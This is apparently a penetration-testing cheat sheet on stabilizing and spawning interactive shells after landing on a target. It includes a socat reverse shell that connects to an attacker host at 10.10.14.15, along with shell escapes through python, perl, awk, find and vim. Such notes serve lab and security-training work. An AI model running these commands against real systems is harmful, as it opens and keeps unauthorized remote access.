# Stabilizing Shells

### Interactive Upgrade

#### Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Python3

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c '__import__("pty").spawn("/bin/bash")'
```

#### Full Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl + z
stty raw -echo; fg
export TERM=xterm
# local terminal
stty -a
# remote terminal 
stty cols=xx rows=xx
```

#### Bash

```bash
SHELL=/bin/bash script -q /dev/null
```

#### SOCAT

**attacker host**

```bash
socat file:`tty`,raw,echo=0 tcp-listen:443
```

**target Host**

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.15:443
```

#### Second Method

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
ctrl+z
```

* in a local terminal

```bash
echo $TERM
stty -a
```

* Set TTY to raw

```bash
stty raw -echo
```

* Foreground the shell

```bash
fg
```

* Reinitialize terminal

```bash
reset
```

* Set shell terminal type

```bash
export SHELL=bash
export TERM=xterm256-color
stty rows 30 columns 108
```

---

## Spawning Interactive Shells

When landing on a system with a limited (non-tty) shell, Python may not be installed. These alternative methods can spawn an interactive shell using whatever is available on the target. Wherever `/bin/sh` appears, it can be replaced with `/bin/bash` if available.

#### /bin/sh -i

Executes the shell interpreter in interactive mode (`-i`).

```bash
/bin/sh -i
```

#### Perl

```bash
perl -e 'exec "/bin/sh";'
```

From within a Perl script:

```perl
perl: exec "/bin/sh";
```

#### Ruby

From within a Ruby script:

```ruby
ruby: exec "/bin/sh"
```

#### Lua

```
lua: os.execute('/bin/sh')
```

#### AWK

```bash
awk 'BEGIN {system("/bin/sh")}'
```

#### Find

Searches for any file, then uses `-exec` to invoke awk which spawns a shell:

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```

Simpler variant that directly launches a shell:

```bash
find . -exec /bin/sh \; -quit
```

#### VIM

```bash
vim -c ':!/bin/sh'
```

Or from within vim:

```
vim
:set shell=/bin/sh
:shell
```

---

## Execution Permissions Check

After spawning a shell, verify what you can do:

```bash
ls -la <path/to/fileorbinary>
```

Check sudo permissions:

```bash
sudo -l
```
